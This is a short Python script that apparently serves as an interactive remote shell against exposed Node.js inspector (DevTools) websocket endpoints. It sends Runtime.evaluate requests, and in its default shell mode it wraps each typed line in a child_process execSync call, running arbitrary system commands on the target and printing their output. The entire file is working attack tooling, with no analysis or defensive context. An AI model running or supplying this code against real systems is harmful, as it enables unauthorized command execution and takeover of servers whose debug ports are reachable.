import websockets, json, textwrap
from colorama import Fore, Style

async def connection(url, shell = True):
    while True:
        user_input = str(input('> '))
        
        data = {
            'id': 1337,
            'method': 'Runtime.evaluate',
            'params': {}
        }
        
        async with websockets.connect(url) as ws:
            if shell:
                user_input = user_input.replace('\\', '\\\\').replace('"', '\\"')

                expression = textwrap.dedent(f"""
                    process.mainModule.require('child_process').execSync("{user_input}").toString()
                """)
            else:
                expression = user_input
            
            data['params']['expression'] = expression

            await ws.send(json.dumps(data))

            try: 
                recv_data = json.loads(await ws.recv())
                
                expression_result = recv_data['result']['result']
                output = expression_result['value'] if 'value' in expression_result else expression_result['type']
                
                print(output.strip())
            except Exception as e:
                print(Fore.RED + e + Style.RESET_ALL)